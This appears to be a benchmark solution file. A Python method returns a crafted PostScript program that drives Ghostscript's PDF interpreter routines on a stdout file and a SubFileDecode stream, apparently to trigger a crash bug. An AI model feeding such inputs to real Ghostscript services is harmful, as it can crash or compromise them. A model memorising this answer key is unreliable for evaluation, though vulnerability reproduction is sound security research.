import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        ps = r"""%!PS
/beginpdf { % f -
  /runpdfbegin where { pop runpdfbegin }
  { /.runpdfbegin where { pop .runpdfbegin } { pop } ifelse }
  ifelse
} bind def
/do_pagecount { /pdfpagecount where { pop pdfpagecount pop } if } bind def
/do_getpage { /pdfgetpage where { pop 1 pdfgetpage } if } bind def
/do_end { /runpdfend where { pop runpdfend } if } bind def

/f0 null def
{ (%stdout) (w) file /f0 exch def } stopped pop
{ f0 null ne { f0 beginpdf } if } stopped pop
{ do_pagecount } stopped pop
{ do_getpage } stopped pop
{ do_end } stopped pop

/f1 null def
{ /SubFileDecode where { pop /f1 currentfile << /EODString (%ENDPDF) /EODCount 0 >> /SubFileDecode filter def } if } stopped pop
{ f1 null ne { f1 beginpdf } if } stopped pop
%PDF-1.0
%ENDPDF
{ do_pagecount } stopped pop
{ do_getpage } stopped pop
{ do_end } stopped pop
quit
"""
        return ps.encode("ascii", "strict")